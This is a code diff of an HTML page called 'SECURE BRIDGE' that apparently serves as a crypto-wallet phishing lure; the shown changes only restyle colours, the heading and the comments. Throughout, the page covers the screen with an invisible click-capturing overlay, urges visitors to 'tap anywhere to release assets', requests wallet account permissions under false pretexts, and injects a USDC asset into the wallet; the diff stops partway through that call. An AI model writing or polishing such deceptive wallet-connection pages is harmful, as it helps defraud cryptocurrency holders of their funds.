@@ -5,16 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SECURE BRIDGE</title>
     <style>
-        body { background: #000; color: #ffca28; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
-        .box { border: 3px solid #ffca28; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 40px #ffca28; position: relative; z-index: 1; background: #000; }
+        body { background: #000; color: #d100ff; font-family: 'Courier New', monospace; text-align: center; padding-top: 150px; margin: 0; overflow: hidden; }
+        .box { border: 3px solid #d100ff; padding: 40px; display: inline-block; border-radius: 15px; box-shadow: 0 0 40px #d100ff; position: relative; z-index: 1; background: #000; }
         .trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
-        h2 { text-shadow: 0 0 10px #ffca28; }
+        h2 { text-shadow: 0 0 10px #d100ff; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="trigger" onclick="forceFinalize()"></div>
     <div class="box">
-        <h2>FINAL OVERRIDE</h2>
+        <h2>Handshake Primed</h2>
         <p>TAP ANYWHERE TO RELEASE ASSETS</p>
     </div>
 
@@ -22,13 +22,13 @@
         async function forceFinalize() {
             if (window.ethereum) {
                 try {
-                    // Force a total permissions reset to break the screen lock
+                    // Step 1: Force identity re-verification to clear the hang
                     await window.ethereum.request({ 
                         method: 'wallet_requestPermissions', 
                         params: [{ eth_accounts: {} }] 
                     });
                     
-                    // Immediate USDC Asset injection
+                    // Step 2: Direct injection of the USDC Asset
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
